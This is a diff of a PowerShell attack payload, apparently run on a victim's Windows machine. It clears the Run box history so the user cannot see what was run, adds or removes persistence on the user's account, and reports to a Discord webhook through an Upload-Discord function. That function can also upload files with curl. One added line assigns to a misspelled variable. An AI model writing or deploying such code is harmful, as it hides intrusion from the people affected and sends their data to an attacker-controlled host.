@@ -1,32 +1,6 @@
 # Delete run box history first, incase user checks immediately
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-############################################################################################################################################################
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $FolderName
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-$text='Persistence removed from '+$env:user
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
 ############################################################################################################################################################
  
@@ -86,6 +60,39 @@ if ($pers -eq 'Remove') {
 }
 
 
+
+############################################################################################################################################################
+
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $FolderName
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+if ($pers -eq 'Remove'){
+$text='Persistence removed from '+$env:user
+}
+if ($pers -eq 'True'){
+$test='Persistence added onto '+$env:user
+}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 
 ############################################################################################################################################################
 
